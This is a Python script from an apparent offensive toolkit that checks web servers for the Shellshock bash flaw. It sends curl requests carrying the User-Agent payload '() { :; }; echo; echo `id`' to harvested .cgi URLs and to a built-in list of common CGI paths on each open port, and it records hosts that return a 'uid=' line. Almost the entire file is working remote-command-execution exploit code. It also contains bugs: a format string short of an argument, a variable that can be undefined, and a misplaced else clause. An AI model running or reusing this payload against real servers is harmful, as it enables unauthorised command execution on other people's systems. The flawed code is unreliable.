# http://blog.knownsec.com/2014/10/shellshock_response_profile_v4/#more-1559
# bash rce
import re
import os
import sys
exp10it_module_path = os.path.expanduser("~") + "/mypypi"
sys.path.insert(0, exp10it_module_path)
from exp10it import get_target_urls_from_db
from exp10it import execute_sql_in_db
from urllib.parse import urlparse
from exp10it import get_string_from_command
from exp10it import CLIOutput
from exp10it import get_target_table_name_list
from exp10it import COMMON_NOT_WEB_PORT_LIST
from exp10it import get_http_domain_from_url
from exp10it import get_target_open_port_list

current_dir = os.path.split(os.path.realpath(__file__))[0]

cgi_list = [
    "/cgi-bin/load.cgi",
    "/cgi-bin/gsweb.cgi",
    "/cgi-bin/redirector.cgi",
    "/cgi-bin/test.cgi",
    "/cgi-bin/index.cgi",
    "/cgi-bin/help.cgi",
    "/cgi-bin/about.cgi",
    "/cgi-bin/vidredirect.cgi",
    "/cgi-bin/click.cgi",
    "/cgi-bin/details.cgi",
    "/cgi-bin/log.cgi",
    "/cgi-bin/viewcontent.cgi",
    "/cgi-bin/content.cgi",
    "/cgi-bin/admin.cgi",
    "/cgi-bin/webmail.cgi",
]

target = sys.argv[1]
print("checking shellshock vul for "+target)
http_domain = get_http_domain_from_url(target)
urls = get_target_urls_from_db(target, "exp10itdb")
urls.append(target)

for each_url in urls:
    if "^" in each_url:
        each_url = each_url.split("^")[0]
    parsed = urlparse(each_url)
    url = parsed.scheme + "://" + parsed.netloc + parsed.path
    if re.search(r"\.cgi$", url, re.I):
        a = get_string_from_command(
            "curl '%s' -A '() { :; }; echo; echo `id`' -k" % url)
        if re.search(r"uid=", a, re.I):
            string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % url
            CLIOutput().good_print(string_to_write)
            with open("%s/result.txt" %
                      current_dir, "a+") as f:
                f.write(string_to_write)
        else:
            print("no shellshock vul")


if target[:4] == "http":
    hostname = urlparse(target).hostname

target_table_name = get_target_table_name_list(target)[0]

open_port_list = get_target_open_port_list(target)
parsed = urlparse(target)
if ":" in parsed.netloc:
    open_port_list.append(parsed.netloc.split(":")[1])


for each_port in open_port_list:
    if each_port not in COMMON_NOT_WEB_PORT_LIST:
        for each_cgi in cgi_list:
            a = get_string_from_command(
                "curl '%s' -A '() { :; }; echo; echo `id`' -k" % (hostname + ":" + each_port + each_cgi))
            if re.search(r"uid=", a, re.I):
                string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % (
                    hostname + ":" + each_port + each_cgi, a)
                CLIOutput().good_print(string_to_write)
                with open("%s/result.txt" % current_dir, "a+") as f:
                    f.write(string_to_write)
            else:
                print("no shellshock vul")
else:
    print("coz I found no nmap scan result from database,I will not run shellshock vul check module on other ports")
